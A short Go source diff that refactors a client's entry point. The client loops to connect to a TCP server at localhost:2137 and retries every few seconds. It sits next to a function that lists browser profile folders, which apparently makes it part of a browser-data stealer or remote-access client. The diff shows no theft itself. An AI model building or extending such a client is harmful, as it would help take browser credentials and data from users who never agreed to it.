@@ -36,6 +36,15 @@ var (
 	}
 )
 
+const (
+	HOST = "localhost"
+	PORT = 2137
+)
+
+func main() {
+	StartClient()
+}
+
 func GetProfiles(browserPath string) []string {
 	var profiles []string
 	if CheckFileExist(browserPath + "\\Default") {
@@ -50,19 +59,16 @@ func GetProfiles(browserPath string) []string {
 	return profiles
 }
 
-func main() {
-	host := "localhost"
-	port := 2137
-
+func StartClient() {
 	for {
-		serverConn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
+		serverConn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", HOST, PORT))
 		if err != nil {
 			log.Errorf("Failed to connect to server: %v", err)
 			time.Sleep(time.Second * 5) // Wait for a while before reconnecting
 			continue
 		}
 
-		log.Infof("Connected to server %s:%d", host, port)
+		log.Infof("Connected to server %s:%d", HOST, PORT)
 
 		handleServerConnection(serverConn)
 	}
